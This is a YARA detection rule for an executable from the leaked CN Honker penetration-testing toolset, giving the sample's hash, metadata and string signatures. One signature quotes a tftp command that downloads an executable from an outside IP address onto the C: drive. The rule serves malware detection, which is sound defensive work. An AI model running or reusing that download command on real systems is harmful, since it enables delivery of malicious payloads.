rule CN_Honker_D_injection_V2_32 {
  meta:
    author = Spider
    comment = None
    date = 2015-06-23
    description = Sample from CN Honker Pentest Toolset - file D_injection_V2.32.exe
    family = injection
    hacker = None
    hash = 3a000b976c79585f62f40f7999ef9bdd326a9513
    judge = unknown
    license = https://creativecommons.org/licenses/by-nc/4.0/
    reference = Disclosed CN Honker Pentest Toolset
    score = 70
    threatname = CN[Honker]/D.injection.V2.32
    threattype = Honker
  strings:
    $s0 = "Missing %s property(CommandText does not return a result set{Error creating obje" wide /* PEStudio Blacklist: strings */
    $s1 = "/tftp -i 219.134.46.245 get 9493.exe c:\\9394.exe" fullword ascii
  condition:
    uint16(0) == 0x5a4d and filesize < 5000KB and all of them
}